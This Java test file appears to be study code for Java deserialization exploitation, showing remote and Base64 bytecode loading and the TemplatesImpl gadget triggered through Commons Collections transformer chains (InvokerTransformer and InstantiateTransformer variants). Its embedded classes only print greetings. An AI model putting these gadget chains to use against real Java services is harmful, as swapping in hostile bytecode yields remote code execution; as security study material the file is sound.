import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl;
import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.map.TransformedMap;
import org.apache.commons.collections.functors.InstantiateTransformer;

import java.lang.reflect.Field;
import javax.xml.transform.Templates;
import java.lang.reflect.Method;
import java.net.URL;
import java.net.URLClassLoader;
import java.util.Base64;
import java.util.HashMap;
import java.util.Map;

public class ByteCode_test {
    public static void remote_test() throws Exception {
        System.out.println("[+] Remote load");
        URL[] urls = {new URL("http://localhost:8000/")};
        URLClassLoader loader = URLClassLoader.newInstance(urls);
        Class c = loader.loadClass("HelloWorld");
        c.newInstance();
    }

    public static void direct_test() throws Exception {
        System.out.println("[+] Direct load via Base64String");
        Method defineClass = ClassLoader.class.getDeclaredMethod("defineClass", String.class, byte[].class, int.class, int.class);
        defineClass.setAccessible(true);

        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIAoACAAQCQARABIIABMKABQAFQgAFggAFwcAGAcAGQEABjxpbml0PgEAAygpVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAARtYWluAQAKU291cmNlRmlsZQEAD0hlbGxvV29ybGQuamF2YQwACQAKBwAaDAAbABwBAA1EaXJlY3QgQWNjZXNzBwAdDAAeAB8BAA1IZWxsbywgV29ybGQhAQANUmVtb3RlIEFjY2VzcwEACkhlbGxvV29ybGQBABBqYXZhL2xhbmcvT2JqZWN0AQAQamF2YS9sYW5nL1N5c3RlbQEAA291dAEAFUxqYXZhL2lvL1ByaW50U3RyZWFtOwEAE2phdmEvaW8vUHJpbnRTdHJlYW0BAAdwcmludGxuAQAVKExqYXZhL2xhbmcvU3RyaW5nOylWACEABwAIAAAAAAACAAEACQAKAAEACwAAAC0AAgABAAAADSq3AAGyAAISA7YABLEAAAABAAwAAAAOAAMAAAADAAQABAAMAAYACQANAAoAAQALAAAAMQACAAAAAAARsgACEgW2AASyAAISBrYABLEAAAABAAwAAAAOAAMAAAAJAAgACgAQAAsAAQAOAAAAAgAP");

        Class hello = (Class)defineClass.invoke(ClassLoader.getSystemClassLoader(), "HelloWorld", code, 0, code.length);
        hello.newInstance();



    }

    public static void setFieldValue(Object obj, String fieldName, Object value) throws Exception {
        Field field = obj.getClass().getDeclaredField(fieldName);
        field.setAccessible(true);
        field.set(obj, value);
    }

    public static void TemplatesImpl_test() throws Exception {
        System.out.println("[+] Direct load via TemplatesImpl");
        // the Byte code here that will be load has some limitation
        // must belong to
        // "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstracTranslet"
        // source: bytecodes/HelloTemplateImpl.java
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABgATCQAUABUIABYKABcAGAcAGQcAGgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHAEAClNvdXJjZUZpbGUBAA50ZW1wX2Vhc3kuamF2YQwADgAPBwAdDAAeAB8BABdUZW1wbGF0ZXNJbXBsIHRyaWdnZXJlZAcAIAwAIQAiAQAJdGVtcF9lYXN5AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAAgACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAKAAsAAAAEAAEADAABAA4ADwACAAkAAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQAKAAAADgADAAAADAAEAA0ADAAOAAsAAAAEAAEAEAABABEAAAACABI=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

        obj.newTransformer();
    }


    // using commoncollection way to trigger TemplatesImpl
    public static void TemplatesImpl_CVer() throws Exception {
        System.out.println("[+] TemplatesImpl + CommonCollections");
        // the Byte code here that will be load has some limitation
        // must belong to
        // "com.sun.org.apache.xalan.internal.xsltc.runtime.AbstracTranslet"
        // source: bytecodes/HelloTemplateImpl.java
        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABgATCQAUABUIABYKABcAGAcAGQcAGgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHAEAClNvdXJjZUZpbGUBAA50ZW1wX2Vhc3kuamF2YQwADgAPBwAdDAAeAB8BABdUZW1wbGF0ZXNJbXBsIHRyaWdnZXJlZAcAIAwAIQAiAQAJdGVtcF9lYXN5AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAAgACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAKAAsAAAAEAAEADAABAA4ADwACAAkAAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQAKAAAADgADAAAADAAEAA0ADAAOAAsAAAAEAAEAEAABABEAAAACABI=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

//        obj.newTransformer();

        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(obj),
            new InvokerTransformer("newTransformer", null, null),
        };

        Transformer TChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, TChain);
        outerMap.put("test", "xxx");

    }
    // No InvokerTransformer
    public static void TemplatesImpl_NVer() throws Exception {
        System.out.println("[+] TemplatesImpl + InstantiateTransformer");

        byte[] code = Base64.getDecoder().decode("yv66vgAAADQAIwoABgATCQAUABUIABYKABcAGAcAGQcAGgEACXRyYW5zZm9ybQEAcihMY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL0RPTTtbTGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABENvZGUBAA9MaW5lTnVtYmVyVGFibGUBAApFeGNlcHRpb25zBwAbAQCmKExjb20vc3VuL29yZy9hcGFjaGUveGFsYW4vaW50ZXJuYWwveHNsdGMvRE9NO0xjb20vc3VuL29yZy9hcGFjaGUveG1sL2ludGVybmFsL2R0bS9EVE1BeGlzSXRlcmF0b3I7TGNvbS9zdW4vb3JnL2FwYWNoZS94bWwvaW50ZXJuYWwvc2VyaWFsaXplci9TZXJpYWxpemF0aW9uSGFuZGxlcjspVgEABjxpbml0PgEAAygpVgcAHAEAClNvdXJjZUZpbGUBAA50ZW1wX2Vhc3kuamF2YQwADgAPBwAdDAAeAB8BABdUZW1wbGF0ZXNJbXBsIHRyaWdnZXJlZAcAIAwAIQAiAQAJdGVtcF9lYXN5AQBAY29tL3N1bi9vcmcvYXBhY2hlL3hhbGFuL2ludGVybmFsL3hzbHRjL3J1bnRpbWUvQWJzdHJhY3RUcmFuc2xldAEAOWNvbS9zdW4vb3JnL2FwYWNoZS94YWxhbi9pbnRlcm5hbC94c2x0Yy9UcmFuc2xldEV4Y2VwdGlvbgEAE2phdmEvbGFuZy9FeGNlcHRpb24BABBqYXZhL2xhbmcvU3lzdGVtAQADb3V0AQAVTGphdmEvaW8vUHJpbnRTdHJlYW07AQATamF2YS9pby9QcmludFN0cmVhbQEAB3ByaW50bG4BABUoTGphdmEvbGFuZy9TdHJpbmc7KVYAIQAFAAYAAAAAAAMAAQAHAAgAAgAJAAAAGQAAAAMAAAABsQAAAAEACgAAAAYAAQAAAAgACwAAAAQAAQAMAAEABwANAAIACQAAABkAAAAEAAAAAbEAAAABAAoAAAAGAAEAAAAKAAsAAAAEAAEADAABAA4ADwACAAkAAAAtAAIAAQAAAA0qtwABsgACEgO2AASxAAAAAQAKAAAADgADAAAADAAEAA0ADAAOAAsAAAAEAAEAEAABABEAAAACABI=");
        TemplatesImpl obj = new TemplatesImpl();
        setFieldValue(obj, "_bytecodes", new byte[][] {code});
        setFieldValue(obj, "_name", "HelloTemplatesImpl");
        setFieldValue(obj, "_tfactory", new TransformerFactoryImpl());

//        obj.newTransformer();

        Transformer[] transformers = new Transformer[] {
            new ConstantTransformer(TrAXFilter.class),
            new InstantiateTransformer(
                new Class[] { Templates.class },
                new Object[] { obj })
        };

        Transformer TChain = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        Map outerMap = TransformedMap.decorate(innerMap, null, TChain);
        outerMap.put("test", "xxx");

    }

    public static void main(String[] args) throws Exception{

        TemplatesImpl_NVer();

        //        remote_test();
        //Direct test;
        direct_test();

//        TemplatesImpl_test();

//        TemplatesImpl_CVer();
    }
}
